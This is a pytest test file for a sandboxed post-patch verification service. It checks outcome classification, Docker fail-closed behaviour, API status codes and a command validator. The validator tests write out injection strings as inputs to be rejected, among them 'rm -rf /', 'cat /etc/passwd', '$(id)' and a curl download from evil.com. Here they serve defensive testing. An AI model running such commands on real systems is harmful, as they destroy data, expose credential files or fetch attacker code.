"""
test_patch_verifier.py — Unit & Integration Tests for Post-Patch Verification (Phase 5B)

Covers:
  1. Valid managed session verification (FIX_VERIFIED).
  2. Missing pre-patch reproduction evidence blocks verification.
  3. Original defect failure pattern persists (FIX_INCOMPLETE).
  4. Different failure pattern occurs after patch (NEW_REGRESSION).
  5. Test execution timeout (BLOCKED).
  6. Docker offline fail-closed behavior (BLOCKED, zero host fallback).
  7. Command injection & metacharacter rejection (;, |, &, `, $, etc.).
  8. Unapproved test runner rejection.
  9. Workspace immutability check.
  10. Endpoint status codes (404 unknown session, 422 unready workspace, 400 missing command).
  11. Real container execution integration test in Docker.
"""

from pathlib import Path
import subprocess
from unittest.mock import patch, MagicMock
import pytest
from fastapi.testclient import TestClient

from app.main import app, sandbox_service
from app.patch_verifier import (
    PatchVerifier,
    PatchVerificationOutcome,
    validate_test_command,
    verify_patch_test,
)
from app.sandbox_controller import SandboxController
from app.sandbox_service import SandboxSessionData
from app.schemas import ReproductionOutcome, ReproductionResult, SandboxState

client = TestClient(app)


# ---------------------------------------------------------------------------
# Fixtures & Helpers
# ---------------------------------------------------------------------------

@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    ws = tmp_path / "sandbox_workspace"
    ws.mkdir()
    (ws / "tests").mkdir()
    (ws / "tests" / "test_sample.py").write_text("def test_ok(): pass\n", encoding="utf-8")
    return ws


def _create_reproduced_session(tmp_path: Path, failure_pattern: str = "ZeroDivisionError") -> str:
    """Helper to create a session that already has pre-patch reproduction evidence."""
    session_id = f"test_ver_{tmp_path.name[:8]}"
    session = SandboxSessionData(
        session_id=session_id,
        repo_url="https://github.com/org/repo",
        issue_url="https://github.com/org/repo/issues/1",
    )
    session.state = SandboxState.COMPLETED
    session.workspace_path = str(tmp_path)
    session.candidate_test_commands = ["pytest"]
    session.expected_failure_pattern = failure_pattern
    session.reproduction_result = ReproductionResult(
        outcome=ReproductionOutcome.REPRODUCED,
        command="pytest",
        exit_code=1,
        timed_out=False,
        stdout="",
        stderr=f"Traceback:\n  File 'calc.py', line 5\n{failure_pattern}: division by zero",
        details="Pre-patch reproduction confirmed.",
    )
    sandbox_service.sessions[session_id] = session
    return session_id


# ---------------------------------------------------------------------------
# 1. Command Validation & Injection Prevention Tests
# ---------------------------------------------------------------------------

def test_validate_test_command_allowed():
    assert validate_test_command("pytest")[0] is True
    assert validate_test_command("pytest tests/test_calc.py -v")[0] is True
    assert validate_test_command("python -m pytest tests/")[0] is True
    assert validate_test_command("python -m unittest discover")[0] is True
    assert validate_test_command("npm test")[0] is True
    assert validate_test_command("cargo test")[0] is True
    assert validate_test_command("go test ./...")[0] is True


def test_validate_test_command_rejects_operators():
    # Semicolon injection
    ok, err = validate_test_command("pytest; rm -rf /")
    assert ok is False
    assert "forbidden shell operators" in err.lower()

    # Pipe injection
    ok, err = validate_test_command("pytest | cat /etc/passwd")
    assert ok is False

    # Redirection injection
    ok, err = validate_test_command("pytest > /tmp/out")
    assert ok is False

    # Backtick injection
    ok, err = validate_test_command("pytest `whoami`")
    assert ok is False

    # Subshell interpolation
    ok, err = validate_test_command("pytest $(id)")
    assert ok is False


def test_validate_test_command_rejects_unapproved_runners():
    ok, err = validate_test_command("curl http://evil.com/script.sh")
    assert ok is False
    assert "approved runner" in err.lower()

    ok, err = validate_test_command("bash test.sh")
    assert ok is False


def test_validate_test_command_rejects_traversal():
    ok, err = validate_test_command("pytest ../../tests/test_bug.py")
    assert ok is False
    assert "traversal" in err.lower()


# ---------------------------------------------------------------------------
# 2. Honest Outcome Classification Logic (Unit Tests with Mocked Container)
# ---------------------------------------------------------------------------

def test_outcome_fix_verified_when_clean_and_defect_absent(workspace: Path):
    """When clean exit code 0 occurs and defect pattern is absent, outcome is FIX_VERIFIED."""
    mock_controller = MagicMock(spec=SandboxController)
    mock_controller.is_docker_available.return_value = True
    mock_controller.build_safe_docker_command.return_value = ["mock_docker", "run"]

    verifier = PatchVerifier(sandbox_controller=mock_controller)

    # Container outputs clean test run
    mock_proc = MagicMock(returncode=0, stdout="1 passed in 0.05s", stderr="")
    with patch("subprocess.run", return_value=mock_proc):
        result = verifier.verify_patch(
            workspace_path=str(workspace),
            test_command="pytest",
            pre_patch_outcome=ReproductionOutcome.REPRODUCED,
            expected_failure_pattern="ZeroDivisionError",
        )

    assert result.outcome == PatchVerificationOutcome.FIX_VERIFIED
    assert result.exit_code == 0
    assert result.timed_out is False
    assert result.pre_patch_observed is True
    assert "defect resolved" in result.details.lower()


def test_outcome_fix_incomplete_when_original_pattern_persists(workspace: Path):
    """When the original defect pattern persists in output, outcome is FIX_INCOMPLETE."""
    mock_controller = MagicMock(spec=SandboxController)
    mock_controller.is_docker_available.return_value = True
    mock_controller.build_safe_docker_command.return_value = ["mock_docker", "run"]

    verifier = PatchVerifier(sandbox_controller=mock_controller)

    # Container outputs error matching original defect
    mock_proc = MagicMock(
        returncode=1,
        stdout="",
        stderr="ZeroDivisionError: division by zero",
    )
    with patch("subprocess.run", return_value=mock_proc):
        result = verifier.verify_patch(
            workspace_path=str(workspace),
            test_command="pytest",
            pre_patch_outcome=ReproductionOutcome.REPRODUCED,
            expected_failure_pattern="ZeroDivisionError",
        )

    assert result.outcome == PatchVerificationOutcome.FIX_INCOMPLETE
    assert result.exit_code == 1
    assert "still observed" in result.details.lower()


def test_outcome_new_regression_when_different_failure_occurs(workspace: Path):
    """When test fails but original defect is absent, outcome is NEW_REGRESSION."""
    mock_controller = MagicMock(spec=SandboxController)
    mock_controller.is_docker_available.return_value = True
    mock_controller.build_safe_docker_command.return_value = ["mock_docker", "run"]

    verifier = PatchVerifier(sandbox_controller=mock_controller)

    # Container outputs an unrelated IndexError instead of ZeroDivisionError
    mock_proc = MagicMock(
        returncode=1,
        stdout="",
        stderr="IndexError: list index out of range",
    )
    with patch("subprocess.run", return_value=mock_proc):
        result = verifier.verify_patch(
            workspace_path=str(workspace),
            test_command="pytest",
            pre_patch_outcome=ReproductionOutcome.REPRODUCED,
            expected_failure_pattern="ZeroDivisionError",
        )

    assert result.outcome == PatchVerificationOutcome.NEW_REGRESSION
    assert result.exit_code == 1
    assert "potential regression" in result.details.lower()


def test_outcome_blocked_when_pre_patch_failure_missing(workspace: Path):
    """CRITICAL: If pre-patch failure was not reproduced, cannot verify fix."""
    verifier = PatchVerifier()
    result = verifier.verify_patch(
        workspace_path=str(workspace),
        test_command="pytest",
        pre_patch_outcome=None,  # Not reproduced!
        expected_failure_pattern="ZeroDivisionError",
    )
    assert result.outcome == PatchVerificationOutcome.BLOCKED
    assert result.pre_patch_observed is False
    assert "not established" in result.details.lower()


def test_outcome_blocked_when_docker_offline(workspace: Path):
    """Fails closed when Docker is offline without host fallback."""
    mock_controller = MagicMock(spec=SandboxController)
    mock_controller.is_docker_available.return_value = False

    verifier = PatchVerifier(sandbox_controller=mock_controller)
    result = verifier.verify_patch(
        workspace_path=str(workspace),
        test_command="pytest",
        pre_patch_outcome=ReproductionOutcome.REPRODUCED,
    )
    assert result.outcome == PatchVerificationOutcome.BLOCKED
    assert "unavailable" in result.details.lower()
    assert result.exit_code is None


def test_outcome_blocked_on_timeout(workspace: Path):
    """Timeout produces BLOCKED status."""
    mock_controller = MagicMock(spec=SandboxController)
    mock_controller.is_docker_available.return_value = True
    mock_controller.build_safe_docker_command.return_value = ["mock_docker", "run"]

    verifier = PatchVerifier(sandbox_controller=mock_controller)
    with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="pytest", timeout=5)):
        result = verifier.verify_patch(
            workspace_path=str(workspace),
            test_command="pytest",
            pre_patch_outcome=ReproductionOutcome.REPRODUCED,
            timeout=5,
        )
    assert result.outcome == PatchVerificationOutcome.BLOCKED
    assert result.timed_out is True
    assert "timed out" in result.details.lower()


# ---------------------------------------------------------------------------
# 3. API Endpoint POST /patch/verify-test Integration Tests
# ---------------------------------------------------------------------------

def test_api_verify_patch_test_success(workspace: Path):
    session_id = _create_reproduced_session(workspace, failure_pattern="ZeroDivisionError")
    try:
        mock_proc = MagicMock(returncode=0, stdout="1 passed in 0.02s", stderr="")
        with patch.object(sandbox_service.sandbox_controller, "is_docker_available", return_value=True), \
             patch("subprocess.run", return_value=mock_proc):
            resp = client.post("/patch/verify-test", json={
                "session_id": session_id,
                "test_command": "pytest",
            })
            assert resp.status_code == 200
            body = resp.json()
            assert body["success"] is True
            assert body["outcome"] == PatchVerificationOutcome.FIX_VERIFIED
            assert body["exit_code"] == 0
            assert body["pre_patch_observed"] is True
    finally:
        sandbox_service.sessions.pop(session_id, None)


def test_api_verify_patch_test_unknown_session_returns_404():
    resp = client.post("/patch/verify-test", json={
        "session_id": "nonexistent_session",
        "test_command": "pytest",
    })
    assert resp.status_code == 404
    assert "not found" in resp.json()["detail"].lower()


def test_api_verify_patch_test_unready_session_returns_422():
    session_id = "test_no_ws"
    session = SandboxSessionData(
        session_id=session_id,
        repo_url="https://github.com/org/repo",
        issue_url="https://github.com/org/repo/issues/1",
    )
    session.state = SandboxState.PENDING
    session.workspace_path = None
    sandbox_service.sessions[session_id] = session
    try:
        resp = client.post("/patch/verify-test", json={
            "session_id": session_id,
            "test_command": "pytest",
        })
        assert resp.status_code == 422
        assert "no active workspace" in resp.json()["detail"].lower()
    finally:
        sandbox_service.sessions.pop(session_id, None)


def test_api_verify_patch_test_missing_command_returns_400(workspace: Path):
    session_id = "test_no_cmd"
    session = SandboxSessionData(
        session_id=session_id,
        repo_url="https://github.com/org/repo",
        issue_url="https://github.com/org/repo/issues/1",
    )
    session.state = SandboxState.READY
    session.workspace_path = str(workspace)
    session.candidate_test_commands = []
    sandbox_service.sessions[session_id] = session
    try:
        resp = client.post("/patch/verify-test", json={
            "session_id": session_id,
            "test_command": None,
        })
        assert resp.status_code == 400
        assert "no test command" in resp.json()["detail"].lower()
    finally:
        sandbox_service.sessions.pop(session_id, None)


# ---------------------------------------------------------------------------
# 4. Live Container Integration Test (Empirical Evidence with Real Docker)
# ---------------------------------------------------------------------------

def test_live_docker_sandbox_verification_flow(workspace: Path):
    """Empirical integration test executing inside real Docker with python:3.11-slim."""
    controller = SandboxController()
    if not controller.is_docker_available():
        pytest.skip("Docker is not currently available for live container testing.")

    # Snapshot workspace before
    before_files = set(f.name for f in workspace.rglob("*"))

    verifier = PatchVerifier(sandbox_controller=controller)

    # Run clean test command inside real container
    result = verifier.verify_patch(
        workspace_path=str(workspace),
        test_command="python -m unittest discover tests",
        pre_patch_outcome=ReproductionOutcome.REPRODUCED,
        expected_failure_pattern="AssertionError",
        timeout=30,
    )

    # Snapshot workspace after
    after_files = set(f.name for f in workspace.rglob("*"))

    assert before_files == after_files, "Workspace must remain unchanged after container test."
    assert result.outcome == PatchVerificationOutcome.FIX_VERIFIED
    assert result.exit_code == 0
    assert result.timed_out is False
    assert result.duration_ms > 0
